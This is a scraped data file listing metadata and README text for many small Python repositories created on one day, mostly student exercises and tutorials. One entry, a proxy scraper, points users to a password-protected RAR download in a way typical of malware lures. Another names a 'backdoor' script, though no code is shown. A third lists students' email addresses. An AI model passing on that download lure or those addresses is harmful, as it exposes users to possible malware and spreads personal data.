417114927;CheckoutAutomation;https://github.com/cAugustoSantana/CheckoutAutomation;Python;2021-10-14T12:07:25Z;0;0;0;CheckoutAutomation Simple checkout Automation utilizing Python and the Selenium Framework How to run Simply download .py file and double clikc(must have python installed) 
417088518;PY_VS_CODE;https://github.com/qyuliyan/PY_VS_CODE;Python;2021-10-14T10:36:34Z;0;0;0;
417135289;SQL-Injection;https://github.com/MigueelHeerrero/SQL-Injection;Python;2021-10-14T13:10:48Z;0;0;0;
417128672;iproctor;https://github.com/daniel5u/iproctor;;2021-10-14T12:51:00Z;0;0;0;iproctor Proctoring system using Python 
417150907;Rock-Paper_Scissor;https://github.com/akash-kumar44/Rock-Paper_Scissor;Python;2021-10-14T13:56:12Z;1;1;0;🎡Rock-Paper_Scissor  Game Using Python Beginner Friendly Easy to use  ♟Want to Play this?  Clone this repository Open in any IDE(for eg. VS Code, PyCharm) Run the file RPS.py  🙌Quick Start to Contribute?  Fork the Repository [click the fork button in the upper right hand corner of a repo page] Clone this Repository https://github.com/<Your-UserName>/Rock-Paper_Scissor Go to the code file and make the changes.  📞Contact Me:         
417105203;Task_Project;https://github.com/sopanpitekar/Task_Project;Python;2021-10-14T11:34:51Z;0;0;0;This is a simple Project on ETL Process 
417173391;Web-Scrape;https://github.com/UjjInd/Web-Scrape;Python;2021-10-14T14:58:16Z;0;0;0;
417135763;PyFnFlow;https://github.com/JihwanKim/PyFnFlow;Python;2021-10-14T13:12:06Z;0;0;0;PyFnFlow python function compose library 
417142277;CP;https://github.com/nidaramzan/CP;Python;2021-10-14T13:31:19Z;0;0;0;
417124611;fliter;https://github.com/GrammyLi/fliter;Python;2021-10-14T12:38:18Z;0;0;0;
417089400;Proxylist-Scrapper;https://github.com/NoNameoN-A/Proxylist-Scrapper;;2021-10-14T10:39:43Z;0;0;0;Proxylist Scrapper Proxy List Scrapper from various websites. They gives the free proxies for temporary use. Click Here for get the file.  Slow download Don't worry is normal, it comes from Sellix servers so maintain active the download and it will be downloaded Rar Password  Use this password: NoNameoN  Tutorial Video  YouTube Video   Usage   Download the file. Click Here   Install Python   Install Proxy-List-Scrapper pip install Proxy-List-Scrapper   This is all categories that you can have, and their source SSL -> https://www.sslproxies.org/ GOOGLE -> https://www.google-proxy.net/ ANANY -> https://free-proxy-list.net/anonymous-proxy.html UK -> https://free-proxy-list.net/uk-proxy.html US -> https://www.us-proxy.org/ NEW -> https://free-proxy-list.net/ SPYS_ME -> http://spys.me/proxy.txt PROXYSCRAPE -> https://api.proxyscrape.com/?request=getproxies&proxytype=all&country=all&ssl=all&anonymity=all PROXYNOVA -> https://www.proxynova.com/proxy-server-list/ PROXYLIST_DOWNLOAD_HTTP -> https://www.proxy-list.download/HTTP PROXYLIST_DOWNLOAD_HTTPS -> https://www.proxy-list.download/HTTPS PROXYLIST_DOWNLOAD_SOCKS4 -> https://www.proxy-list.download/SOCKS4 PROXYLIST_DOWNLOAD_SOCKS5 -> https://www.proxy-list.download/SOCKS5   Variables used  @proxies is the list of Proxy Class which has actual proxy. @len is the count of total proxies in @proxies. @category is the category of proxies defined above.  
417049146;FrbUS;https://github.com/IbHansen/FrbUS;Jupyter Notebook;2021-10-14T08:26:16Z;0;0;0;
417143921;formation_python_projet_4_gestionnaire_echecs;https://github.com/ArmandArthur/formation_python_projet_4_gestionnaire_echecs;Python;2021-10-14T13:36:14Z;0;0;0;formation_python_projet_4_gestionnaire_echecs 
417180343;Unit5-03-Python-percentage_marker;https://github.com/crestel-ong/Unit5-03-Python-percentage_marker;Python;2021-10-14T15:16:36Z;0;0;0;Unit5-03-Python-percentage_marker  
417078555;DataCamp_Data-Scientist-with-Python-E;https://github.com/danielwon01/DataCamp_Data-Scientist-with-Python-E;;2021-10-14T10:01:17Z;0;0;0;Pseudolab_DataCamp learn the following things at the Data Camp Data Scientist with Python course. import, clean, manipulate, and visualize data Python libraries, including pandas, NumPy, Matplotlib statistical and machine learning 
417192801;ICS3U-Assignment-5B-Python;https://github.com/Joshua-Yeung-2/ICS3U-Assignment-5B-Python;;2021-10-14T15:53:21Z;0;0;0;ICS3U-Assignment-5B-Python  
417150434;Board_Infinity_ML_Python_New_Project;https://github.com/stepin-104624/Board_Infinity_ML_Python_New_Project;Jupyter Notebook;2021-10-14T13:55:03Z;0;0;1;Board_Infinity_ML_Python_New_Project 
417159967;LHD-Learn---Day-4-Python-project;https://github.com/Tanishk-Saxena/LHD-Learn---Day-4-Python-project;Python;2021-10-14T14:21:40Z;0;0;0;LHD-Learn---Day-4-Python-project MLH LHD: Learn 2022 Day 4 challenge Name:                              email Kapil  Mandowra:                   kapilmandowra96@gmail.com Tanishk Saxena:                    tanishksaxena686@outlook.com Shreyash Ghorpade:                 ghorpadeshreyas5@gmail.com Dhiren Kumar:                      sherlockholmesis007@gmail.com 
417131595;YouTube-video-downloader-using-python-GUI;https://github.com/shiva-sundar/YouTube-video-downloader-using-python-GUI;Python;2021-10-14T13:00:07Z;0;0;0;
417067284;Introduction-to-Data-Science-in-Python;https://github.com/caiosimoess/Introduction-to-Data-Science-in-Python;;2021-10-14T09:24:03Z;0;0;0;
417184353;python-jogo-adivinhacao-v1.0;https://github.com/MatheusPdoN/python-jogo-adivinhacao-v1.0;;2021-10-14T15:28:11Z;0;0;0;python-jogo-adivinhacao-v1.0 Meu jogo de adivinhação criado através da linguagem Python, durante meu aprendizado. 
417093163;Datacamp-Regression-with-Statsmodels-in-Python;https://github.com/DVM-Moheb/Datacamp-Regression-with-Statsmodels-in-Python;Jupyter Notebook;2021-10-14T10:53:04Z;0;0;0;(Datacamp - Regression with Statsmodels in Python) by (Moheb Maher) N.B.   It is still in progress.   
417156210;Register_and_login_-using_python_flask-mongodb-;https://github.com/Mustaphayinka/Register_and_login_-using_python_flask-mongodb-;HTML;2021-10-14T14:11:05Z;0;0;0;Register_and_login_-using_python_flask-mongodb- 
417177487;Python-Programming-Course-Bundle-Build-15-Applications;https://github.com/inasalkamachy/Python-Programming-Course-Bundle-Build-15-Applications;;2021-10-14T15:08:47Z;0;0;0;
417142502;Data_science_whit_SAS_and_Python;https://github.com/andrade-lcs/Data_science_whit_SAS_and_Python;Jupyter Notebook;2021-10-14T13:32:00Z;0;0;0;Data_science_whit_SAS_and_Python In this repository will be shared the codes os SAS and Python 
417124276;211014---BAEKJUN-3-11-with-Python;https://github.com/Readrive/211014---BAEKJUN-3-11-with-Python;Python;2021-10-14T12:37:10Z;0;0;0;
417161731;The-Complete-Python-Pro-Bootcamp-for-2021;https://github.com/haohao2021/The-Complete-Python-Pro-Bootcamp-for-2021;Python;2021-10-14T14:26:18Z;0;0;0;
417190145;ICS3U-Unit5-03-Python;https://github.com/Michael-Zagon/ICS3U-Unit5-03-Python;Python;2021-10-14T15:45:34Z;0;0;0;ICS3U-Unit5-03-Python  
417072438;Data-scientist-with-python-DataCamp;https://github.com/shomerthesec/Data-scientist-with-python-DataCamp;Jupyter Notebook;2021-10-14T09:40:26Z;1;1;0;Data-scientist-with-python-DataCamp projects done in DataCamp's career track of Data Scientist with Python 
417150125;To-do-List-Using-Python-Django;https://github.com/angaitkarshivam/To-do-List-Using-Python-Django;Python;2021-10-14T13:54:12Z;0;0;0;
417084037;IITM-Bsc-Degree-Programming-in-Python;https://github.com/pratyush-singh-08/IITM-Bsc-Degree-Programming-in-Python;Python;2021-10-14T10:20:22Z;0;0;0;
417087523;Recommendation-System;https://github.com/acmpesuecc/Recommendation-System;Jupyter Notebook;2021-10-14T10:32:50Z;1;1;3;Recommendation-system (Cap of 5 pull requests on the entire repository during the boost period.) It would be optimal to execute this program in google colab(Execute the notebook file in that google colab),unless you wish to run it as python code which could result in some errors. Purpose:- The purpose of this system is to allow users to get recommendations for their favourite shows and a further aim for anyone to find the best possible recommendation for any item as long as its data is specified in the .csv file . Libraries needed for the program are:-  import networkx as nx import matplotlib.pyplot as plt import pandas as pd import numpy as np import math as math import time  Additional features to be added:-   Add a GUI.  Add more features which can be connected to the file(rather than just genre).  Add a file uploader in the GUI to allow for different files to be used as well as the option to alter the options on which the recommendations must be searched.  Allow for a search function in GUI to allow the user to view the titles of the websites from the .csv file.  How to contribute:- Make you way to the contrinuting.md file . Note screenshots for each PR is needed. 
417113652;Data_Science;https://github.com/caio-camanho/Data_Science;;2021-10-14T12:03:30Z;0;0;0;Data_Science Data Science 
417159996;Linear_search;https://github.com/rashidov9797/Linear_search;Python;2021-10-14T14:21:45Z;0;0;0;
417145304;Hand-gesture-recognition;https://github.com/JKottonen/Hand-gesture-recognition;Python;2021-10-14T13:40:24Z;0;0;0;Hand-gesture-recognition Opencv-library project for python 
417064596;py;https://github.com/Ignotron/py;;2021-10-14T09:16:19Z;0;0;0;
417110959;aws-sam-helloworld;https://github.com/milanoid/aws-sam-helloworld;Python;2021-10-14T11:54:42Z;0;0;0;"Hello world SAM application My notes based on tutorial. Creates AWS SAM ""Hello World"" app. Uses AWS Lambda, API Gateway and S3. Yak shaving  AWS account Docker (for testing app locally) Homebrew AWS SAM CLI Python 3.9 (pyenv + virtualenv)  Python & Pyenv Pyenv is a tool to install and manage multiple versions of Python interpreter.  pyenv install 3.9.7 inside project folder: pyenv local 3.9.7 - creates .python-version - no need to manually switch optionally pyenv global 3.9.7 which python should return /Users/milan/.pyenv/shims/python  In PyCharm create a new virtual environment (virtualenv) based on pyenv interpreter 3.9.7. SAM CLI macOS's installation instructions brew tap aws/tap brew install aws-sam-cli  SAM build, test and deploy Hello World SAM app guide.  sam init sam build sam deploy --guided  Follow sam init instructions:  AWS Quick Start Templates ZIP package type runtime Python 3.9 Hello World Example  🎁 API Gateway endpoint (with no access restrictions!) is deployed on URL like https://83ry3sczj4.execute-api.eu-central-1.amazonaws.com/Prod/hello milan@Milans-MBP-2 sam-app % http https://83ry3sczj4.execute-api.eu-central-1.amazonaws.com/Prod/hello HTTP/1.1 200 OK Connection: keep-alive Content-Length: 26 Content-Type: application/json Date: Thu, 14 Oct 2021 11:42:46 GMT Via: 1.1 71c4b07776e0b6812900664940c9d7a7.cloudfront.net (CloudFront) X-Amz-Cf-Id: 8pe15WRBDocUd2pBpQfYF8m_SfPj6qKgg9A1fysZb8eXS-PP5m-CrA== X-Amz-Cf-Pop: FRA56-P4 X-Amzn-Trace-Id: Root=1-616817b5-1495787e12f6e6fc7d0b9e08;Sampled=0 X-Cache: Miss from cloudfront x-amz-apigw-id: HMikbG5LliAFoLw= x-amzn-RequestId: 1acfaa63-dc40-401f-95c4-0a26e7cfef13  {     ""message"": ""hello world"" }  Cleanup Remove it by deleting the AWS CloudFormation stack either manually in AWS Management Console or by AWS CLI command: aws cloudformation delete-stack --stack-name sam-app --region eu-central-1 "
417085193;py-despat;https://github.com/zarcen/py-despat;Python;2021-10-14T10:24:26Z;0;0;0;"Design Pattern using python implementation Introduction Prerequisite  python3 (python-3.9.5) pip/pip3 (pip-20.0.2) pytest (pytest-6.2.4)  This repo demonstrates various design patterns implementation in python. The goal is to maintain quick templates as these patterns would be used over and over during development 😐. Why python 🤔? Well, most design patterns are naturally derived from OOP languages like Java or C#. There are tons of samples already when there's a need to bring up things from scratch with Java by applying certain pattern. On the other hand, not so common for python. File Layout For each pattern, it is structured as follows.  Note: It is simply to be a package by putting an empty __init__.py pattern_foo/     __init__.py               # needed to be treated as a pacakge     pattern_foo_cxt1_abc.py   # ""_abc"" suffix as abstract class     pattern_foo_cxt2_abc.py     ...     tests/         __init__.py           # needed to be treated as a pacakge         test_pattern.py To run the test for a pattern: $ pytest <pattern_name> Quick Pattern Links  Strategy Pattern Observer Pattern Command Pattern  SOLID Principles of OO Design   Single respoinsibilie A class should have only single one responsibility   Open-closed A class should be open to extension, usually by inheritance. But close to modification.   Liskov substitution Subclasses should be able to stand in for their parents in a program without breaking anything   Interface segregation Many specific interfaces are better than one do-it-all interface. (In python, using abstract base classes combined with multiple inheritance to achieve this)   Dependency inversion Program toward abstrations not implementations.   Abstraction Base Class Definition Sadly, PEP8 doesn't have naming convention for abc (Abstract Base Class). Here, just use I prefix as the notation like other languages like C++ or Java According to module abc, simply inheriting from abc.ABC is the recommended way to define a ABC. from abc import ABC  class IFoo(ABC):     """"""Abstract Base Class Definition""""""      # Define a abstract method     @abc.abstractmethod     def do_something(self, val):         """"""Required method""""""      # Define a abstract property     @abc.abstractproperty     def some_property(self):         """"""Required property"""""" Concrete Class Implementation Derived class inherits the ABC. Like C++, python supports multiple inheritance. Say, Foo implements two ABCs: IFoo and IBar class Foo(IFoo, IBar):     """"""Implementation of IFoo and IBar""""""      def __init__(self, val=None):         self._val = val      def do_something(self, val):         """"""Implementation of abstract method""""""         self._val += 10          @property     def some_property(self):         """"""Implementation of abstract property""""""         return self._val          @property     def bar_property(self):         return self._bar Strategy Pattern  Classification: Behavioral Family of algorithms Encapsulate each one Make them interchangeable Algorithms vary independently Also know as: Policy Pattern  Observer Pattern  Classification: Behavioral One to many relationship Between a set of objects When the state of one changes… Its dependents are notified Also know as: Dependents pattern or Publish-Subscribe pattern Used a lot in GUI In MVC pattern: Model = Subject, Viewer = Observer  Command Pattern  Classification: Behavioral Encapsulate a request as an object Parameterize objects Queues and log operations Undoable operations and macros Also know as: Action pattern or Transaction pattern Useful for command line programs and menu like applications (each menu item is like a command) Easy to provide validation and undo for a command  "
417129708;Election_Analysis;https://github.com/elena-chambers/Election_Analysis;;2021-10-14T12:54:14Z;0;0;0;Election_Analysis Week 3, python-VS Code 
417179089;coeciber;https://github.com/darleydias/coeciber;HTML;2021-10-14T15:13:01Z;0;0;0;coeciber 
417168269;Binary_search_algorithm;https://github.com/rashidov9797/Binary_search_algorithm;Python;2021-10-14T14:44:10Z;0;0;0;
417068548;Programmierkurs;https://github.com/Mathe-SH/Programmierkurs;Jupyter Notebook;2021-10-14T09:27:53Z;0;0;0;Programmierkurs Python-Programmierkurs für Mathe^SH. In diesem Programmierkurs für Python sollen die Schülerinnen und Schüler Grundlagenkenntnisse in Python erhalten. Ziel ist es, die Mathe^SH-Vorträge um kleinere Programmierprojekte zu erweitern, mit denen man komplexere und größere Rechnungen automatisieren kann, um ein besseres Verständnis zu den Themen zu erhalten. Ebenso sollen die Schülerinnen und Schüler einen Eindruck erhalten, wie angewandte Mathematiker arbeiten. Evaluationstest Im Evaluationstest sollen Schülerinnen und Schüler mit Vorkenntnissen testen können, ob sich der Einführungskurs für sie lohnt. Sicherlich gibt es immer Themen, die noch neu sind, bei bereits bekannten Themen ließen sich aber schon kompliziertere Projekte umsetzen.  
417087063;roblox-api-wrapper;https://github.com/dumb-stuff/roblox-api-wrapper;Python;2021-10-14T10:31:11Z;0;0;0;roblox-api-wrapper Roblox API Wrapper for python 
417183658;Boxer-Tools;https://github.com/cH3Ck-m8/Boxer-Tools;Python;2021-10-14T15:26:05Z;0;0;0;
417140371;MarksPasswordGen;https://github.com/shortma1/MarksPasswordGen;Python;2021-10-14T13:25:36Z;0;0;0;MarksPasswordGen Mark's Python Password Generator 
417162608;Battleship;https://github.com/benjaminbiss/Battleship;Python;2021-10-14T14:28:52Z;0;0;0;Battleship The game Battleship in python Rough UML main.py gamespace.py player.py gameboard.py ship.py aircraft_carrier.py 'A' battleship.py   'B' submarine.py    'S' destroyer.py    'D'  import getPass - used to mask inputs print a version of the board that does not show ship locations maybe, use a table display tool  2d list     grid[y][x] - print each row to show table    x -  1    2    3... y - a    [a1,  a2,  a3] b    [b1,  b2,  b3] c    [c1,  c2,  c3]  Table legend:  w : water a : aircraft carrier b : battleship s : submarine d : destroyer  ''x : ship hit m : water hit/ miss  
417066652;hello-world_py;https://github.com/supriyak2612/hello-world_py;Python;2021-10-14T09:22:29Z;0;0;0;hello-world_py python testing code on Quod I want to test on adding python code for testing 
417181747;JARVIS;https://github.com/arkapg211002/JARVIS;Python;2021-10-14T15:20:42Z;0;0;0;
417057920;matkod;https://github.com/Aysegul50/matkod;;2021-10-14T08:54:57Z;0;0;0;matkod matematik 3.hafta python kodlama 
417111419;euclidean_algorithm;https://github.com/h2sm/euclidean_algorithm;Python;2021-10-14T11:56:07Z;0;0;0;euclidean_algorithm Euclidean algorithm writtwen on python 
417195451;ICS3U-Unit5-03-Python-Grade_Percentage;https://github.com/Rodas-Nega1/ICS3U-Unit5-03-Python-Grade_Percentage;Python;2021-10-14T16:01:16Z;0;0;0;ICS3U-Unit5-03-Python-Grade_Percentage  
417088953;Learn-To-Build-API-From-Scratch-Using-Python-;https://github.com/engsopha/Learn-To-Build-API-From-Scratch-Using-Python-;;2021-10-14T10:38:06Z;0;0;0;Learn-To-Build-API-From-Scratch-Using-Python- I started this repo to record and share my journey of How to build an Web API using Python (flask)? from the scratch.  Spend 1 hour at least to learn API Record all the step to research, learn, error, resource, people related.  
417192777;ICS3U-Unit5-03-Python-Mark;https://github.com/liam-fletcher1/ICS3U-Unit5-03-Python-Mark;Python;2021-10-14T15:53:17Z;0;0;0;ICS3U-Unit5-03-Python-Mark  
417189131;ICS3U-Unit5-03-Python-Level;https://github.com/haokai-li/ICS3U-Unit5-03-Python-Level;Python;2021-10-14T15:42:35Z;0;0;0;ICS3U-Unit5-03-Python-Level  
417144391;-ANPR-with-Python-OpenCV-and-EasyOCR-;https://github.com/youssefkhalil320/-ANPR-with-Python-OpenCV-and-EasyOCR-;Python;2021-10-14T13:37:36Z;0;0;0;
417153798;FreeCodeCamp-Scientific-Computing-with-Python-Projects;https://github.com/jasonjholt/FreeCodeCamp-Scientific-Computing-with-Python-Projects;Python;2021-10-14T14:04:13Z;0;0;0;FreeCodeCamp-Scientific-Computing-with-Python-Projects Projects made for the Scientific Computing with Python Certification on freecodecamp.org 
417188251;ICS3U-Unit5-03-Python-Percentage;https://github.com/matthew-meech/ICS3U-Unit5-03-Python-Percentage;;2021-10-14T15:39:57Z;0;0;0;ICS3U-Unit5-03-Python-Percentage  
417128983;python_r_AtCuInEnPesqE;https://github.com/andradefisio/python_r_AtCuInEnPesqE;;2021-10-14T12:51:57Z;0;0;0;
417188069;ICS3U-Unit5-03-Python-GradingConversion;https://github.com/dbcalitis/ICS3U-Unit5-03-Python-GradingConversion;Python;2021-10-14T15:39:26Z;0;0;0;ICS3U-Unit5-03-Python  
417099103;convolutional-neural-network-for-image-classification-with-python-and-keras;https://github.com/python-dontrepeatyourself/convolutional-neural-network-for-image-classification-with-python-and-keras;Jupyter Notebook;2021-10-14T11:13:31Z;0;0;0;Convolutional Neural Network for Image Classification with Python and Keras This is the repository for the tutorial: https://dontrepeatyourself.org/post/convolutional-neural-network-for-image-classification-with-python-and-keras/ 
417046714;Cau_truc_du_lieu_va_giai_thuat_python;https://github.com/thien1892/Cau_truc_du_lieu_va_giai_thuat_python;Jupyter Notebook;2021-10-14T08:18:38Z;0;0;0;Cau_truc_du_lieu_va_giai_thuat_python Cau_truc_du_lieu_va_giai_thuat_python 
417151950;Space-Y_Python-Basics-for-Data-Science-Project;https://github.com/fenixdhq/Space-Y_Python-Basics-for-Data-Science-Project;Python;2021-10-14T13:59:15Z;0;0;0;Python-Basics-for-Data-Science-Project---Space-Y This is the Python Basics for Data Science Project - Final Work Trabajo final, con muchas pilas!!! 
417188223;ICS3U-Unit5-03-Python-Program;https://github.com/Igor-Zhelezniak-1/ICS3U-Unit5-03-Python-Program;Python;2021-10-14T15:39:51Z;0;0;0;ICS3U-Unit5-03-Python-Program  
417099246;Python_3_PyQt5_Table_DEMO2;https://github.com/tsnsoft/Python_3_PyQt5_Table_DEMO2;Python;2021-10-14T11:14:00Z;0;0;0;Python_3_PyQt5_Table_DEMO2 Работа с визуальными табличными данными в Python 3 с PyQt5  
417099642;Python_3_PyQt5_Table_DEMO3;https://github.com/tsnsoft/Python_3_PyQt5_Table_DEMO3;Python;2021-10-14T11:15:33Z;0;0;0;Python_3_PyQt5_Table_DEMO3 Работа с визуальными табличными данными в Python 3 с PyQt5  
417049123;Search-Academy-Project--Pass-Technical-Interview-with-python;https://github.com/Klinsmann-Agyei/Search-Academy-Project--Pass-Technical-Interview-with-python;Python;2021-10-14T08:26:12Z;0;0;0;
417059366;auth-web-excercise-2;https://github.com/boks01/auth-web-excercise-2;HTML;2021-10-14T08:59:39Z;0;0;0;
417183813;scratchmap;https://github.com/taylorkrn/scratchmap;Python;2021-10-14T15:26:35Z;0;0;0;#Work in progress Creating a website/App which allows users to register/login and create their own online scratch maps Python/Flask Project 
417145711;JusTech;https://github.com/AnthonyEfe/JusTech;;2021-10-14T13:41:34Z;0;0;0;JusTech Online web store using flask and python 
417063793;Flask_restfulAPI;https://github.com/GrodeJiang/Flask_restfulAPI;Python;2021-10-14T09:14:00Z;0;0;0;
417125479;pytools;https://github.com/Fassial/pytools;Python;2021-10-14T12:41:05Z;0;0;0;pytools Some python toolkits developed by myself. 
417062263;OpenCV;https://github.com/PasaricaDianaIleana/OpenCV;C++;2021-10-14T09:09:05Z;0;0;0;
417146121;Different-set-operations;https://github.com/LHande29/Different-set-operations;Python;2021-10-14T13:42:39Z;0;0;0;Different-set-operations python program to illustrate different set operations 
417128980;speech-feature-kit;https://github.com/dhchenx/speech-feature-kit;Python;2021-10-14T12:51:57Z;0;0;0;"Speech Feature Kit A Python wrapper for convenient speech feature extraction. (Alpha version) Installation pip install speech-features-kit  Dependencies  numpy scipy  Credits aishoot's Project Sample code Example 1: import speech_features_kit.MFCC.MFCC as mf  import scipy.io.wavfile as wav  (rate,sig) = wav.read(""output/english.wav"") mfcc_feat = mf.mfcc(sig, rate) d_mfcc_feat = mf.delta(mfcc_feat, 2) fbank_feat = mf.logfbank(sig, rate)  print(fbank_feat[1:3,:]) Example 2: import wave import pylab as pl import numpy as np import speech_features_kit.Volume.Volume as vp  # ============ test the algorithm ============= # read wave file and get parameters. fw = wave.open('../data/english.wav','rb') params = fw.getparams() print(params) nchannels, sampwidth, framerate, nframes = params[:4] strData = fw.readframes(nframes) waveData = np.fromstring(strData, dtype=np.int16) waveData = waveData*1.0/max(abs(waveData))  # normalization fw.close()  # calculate volume frameSize = 256 overLap = 128 volume11 = vp.calVolume(waveData,frameSize,overLap) volume12 = vp.calVolumeDB(waveData,frameSize,overLap)  # plot the wave time = np.arange(0, nframes)*(1.0/framerate) time2 = np.arange(0, len(volume11))*(frameSize-overLap)*1.0/framerate pl.subplot(311) pl.plot(time, waveData) pl.ylabel(""Amplitude"")  pl.subplot(312) pl.plot(time2, volume11) pl.ylabel(""absSum"")  pl.subplot(313) pl.plot(time2, volume12, c=""g"") pl.ylabel(""Decibel(dB)"") pl.xlabel(""time (seconds)"") pl.show() "
417166380;hello;https://github.com/jcoutinho30/hello;HTML;2021-10-14T14:39:04Z;0;0;0;
417176669;CoffeMachine;https://github.com/RareMv/CoffeMachine;;2021-10-14T15:06:34Z;0;0;0;Coffee Machine Project build in Python Simple Python Project that simulates in a terminal like fashion how ordering one of 3 coffees would work. Program Requirements  Print report Check if machine has enough resources (water / milk / coffe)? Process coins Check transaction succesful Make Coffe  Running the program + expected steps  Download and run Coffee Machine.exe Choose beverage between espresso / latte / cappuccino Input amount of quaters (25 cents) , dimes (10 cents), nickels (5 cents) and pennies (1 cent) You will receive change based on beverage chosen and amount introduced  Extra details Each beverage is composed of water, milk and coffe. A cost is also assigned to the beverage itself. Depending on the amount of money introduced, the program will calculate total sum received and offer to return change if amount introduced is (likely) higher than cost of beverage. Current status: Code available Program is executable Main loop in regards to beverage desired Calculating change based on amount typed in and returning the beverage Denial of order if not sufficient money is typed in What doesn't work (yet?):  Adjusting machine resources based on beverages ordered Printing a Denial Message if there are not sufficient resoureces for a beverage  
417129959;stone-paper-scissor-game;https://github.com/Smit-D/stone-paper-scissor-game;;2021-10-14T12:55:02Z;0;0;0;stone-paper-scissor-game Stone-Paper-Scissor game using core python. Play Stone-Paper-Scissor game with computer 
417148749;LCAPython;https://github.com/ciandoyle251/LCAPython;Python;2021-10-14T13:50:15Z;0;0;0;
417191559;Numerical-Analysis;https://github.com/11carlesnavarro/Numerical-Analysis;Python;2021-10-14T15:49:37Z;0;0;0;Numerical-Analysis Some numerical analysis methods implemented in python. 
417192604;Sleep;https://github.com/HUSKI3/Sleep;;2021-10-14T15:52:47Z;0;0;0;Sleep A simple Code Editor built in Python 
417051329;LetsGO;https://github.com/ProgrammingStuff1/LetsGO;;2021-10-14T08:32:59Z;0;0;0;LetsGO Python projects for advanced user and beginer 
417061073;backdoor;https://github.com/shubhamkumar-yadav/backdoor;Python;2021-10-14T09:04:54Z;0;0;0;backdoor This is a backdoor script using python ....... 
417095577;pong;https://github.com/aryanshb/pong;Python;2021-10-14T11:01:30Z;0;0;0;
417160400;Guiprojects;https://github.com/Pritish934/Guiprojects;Python;2021-10-14T14:22:56Z;0;0;0;Guiproject This repository contain some usefull gui projects for python We will use Tkinter to create our gui 
417179401;Web-Scrapper;https://github.com/sdyoon94/Web-Scrapper;Python;2021-10-14T15:13:54Z;1;1;0;"Web-Scrapper  [초급]Python으로 웹 스크래퍼 만들기 - NomadCoders  기초적인 Python 문법강의부터 시작하여 웹사이트의 html파일에서 원하는 내용을 Scrapping해서 출력, csv 파일로 저장, flask를 이용한 간단한 웹페이지 및 fakedb를 구축하는 방법을 배우는 코스입니다. django를 시작하기 전 간단히 설명해주는 강의가 포함되어 있습니다. ※ 주의사항 : indeed 사이트에서 가끔 캡챠에 걸려서 에러가 발생할 때가 있음... 사용 기술  Python html  진도   파이썬 기초 강의  Indeed에서 구직정보 추출하기  StackOverflow에서 구직정보 추출하기  CSV파일로 저장하기  Flask를 이용하여 웹사이트에서 정보 주고 받기  사용자에게 입력값을 받아 Scrapping하기  Fake DB 만들기  웹사이트에 구직정보 렌더링하기  CSV파일로 저장하기 기능 구현  최종 결과물 업데이트  결과물  index.html  검색어 입력시 나타나는 report.html  export 선택 시 저장되는 csv파일   강의에서 배운 Tips  import를 이용해 패키지 또는 다른 파일의 함수를 사용할 수 있다. from을 이용해 원하는 함수만 가져올 수 있다. as를 이용해 함수의 이름을 바꿀 수 있다.  import 패키지 from 패키지 import 함수 from 패키지 import 함수 as 다른 이름  문자열에 변수 집어넣기 : f""variable name : {변수 이름}"" urllib3보다 requests가 더 사용하기 편하다. BeautifulSoup를 이용하여 HTML문서에서 원하는 데이터에 간편하게 접근할 수 있다. list[-1]은 list의 마지막 요소를 가리킨다. list[0:-1] 또는 list[:-1]은 list의 첫번째부터 마지막 전까지를 나타낸다.(마지막 요소를 제외한 모든 요소)[]안의 -1은 'len(list)-1'로 추정된다.(개인적인 생각) csv 파일로 저장하기  import csv  file = open(""파일명.csv"", mode=""w"") writer = csv.writer(file) writer.writerow([""내용"", ""내용"", ""내용"", ..., ""내용""])  Flask 사용하기  app = Flask(""앱이름"")  @app.route(""/"")           # 기본주소(주로 index.html) def 함수이름():             # @app.route(""주소"") 다음에 오는 함수에 주소 적용!   return html형식          # return 값에 html형식으로 문자열을 입력하거나 @app.route(""/기타주소"") def 함수이름():   return render_template(""파일이름.html"") # 외부 html을 render_template을 사용해 불러올 수 있음. @app.route(""/<변수이름>"")  # 주소에서 변수를 받아오면 def 함수이름(변수이름):      # 함수에서 매개변수로 사용해야함(안 하면 오류 발생)   return html형식                           # 이떄 기본 주소는 http://0.0.0.0/여야 하는데 app.run(host=""0.0.0.0"")   # 터미널에 * Running on http://192.168.###.###:5000/                           # 라고 뜨면서 저 주소로 접속해야 html이 나타남  Query arguments : http://주소/###?단어=단어&단어=단어... 에서 ? 뒤에 나오는 긴 문자열 Flask를 통해 html에서 파이썬 이용하기  render_template(""파일명.html"", 변수 이름 = 변수)를 통해 html파일로 변수를 넘길 수 있다. html에서는 {{변수 이름}}으로 사용 가능하다. html에서 python 문법은 {% 문법 %}으로 사용 가능하다.※ 주의! : 꼭 {% endif %}, {% endfor %} 등으로 끝났음을 나타내야한다.    <!-- 변수 사용은 이렇게! --> <h1>Hi {{Name}}~</h1> <section>   <!-- 문법 사용은 이렇게! -->   {% for n in range(5) %}   <span>{{n}}번째 span<br /></span>   {% endfor %}   <!-- 꼭 닫아주기! --> </section>  css grid에 대해 더 배우고 싶으면 css master 강좌 수강하기  기타  package 확인하기  $ pip show 'package-name'  package 설치하기  $ pip install 'package-name'  다른 환경에서 작업할 일이 많을 경우 requirements.txt로 패키지를 관리하면 편리하다.(이름을 꼭 저걸로 할 필요는 없으나 대부분 저 이름으로 관리)  #파일 생성 $ pip freeze > requirements.txt  #패키지 설치 $ pip install -r requirements.txt "
417192693;mhttp.py;https://github.com/oppositecategory/mhttp.py;Python;2021-10-14T15:53:00Z;0;0;0;mHTTP.py mHTTP is a small multithreaded websocket server written in Python. The library implements an application-layer protocol named mHTTP (minimal HTTP). Elliptic-curve Diffie–Hellman scheme is to be added in the TCP layer to encrypt communication. 
417059162;Hello1;https://github.com/Nimnambui/Hello1;;2021-10-14T08:58:59Z;0;0;0;
417072130;hello;https://github.com/SanjayDatta/hello;HTML;2021-10-14T09:39:24Z;0;0;0;
417112350;Molden2VMD;https://github.com/JelenDP/Molden2VMD;Python;2021-10-14T11:59:16Z;0;0;0;Molden2VMD python script format any MOLDEN to VMD 
417147127;Resume-Parser-model;https://github.com/charvibannur/Resume-Parser-model;Jupyter Notebook;2021-10-14T13:45:31Z;0;0;0;Resume Parser model Resume parsing with machine learning using python. 
417155427;CS50;https://github.com/dhvozdetskyi/CS50;HTML;2021-10-14T14:08:51Z;0;0;0;
417114125;pogGame;https://github.com/Shalabyelectronics/pogGame;;2021-10-14T12:04:56Z;0;0;0;pogGame Start practicing programming pog game with python 
417147054;Snake-Game;https://github.com/g-o-d-f-a-t-h-e-r/Snake-Game;Python;2021-10-14T13:45:20Z;0;0;0;Snake-Game A snake game made using Python Just download the 'snake.py' and 'python' from the official website and enjoy the game ! 
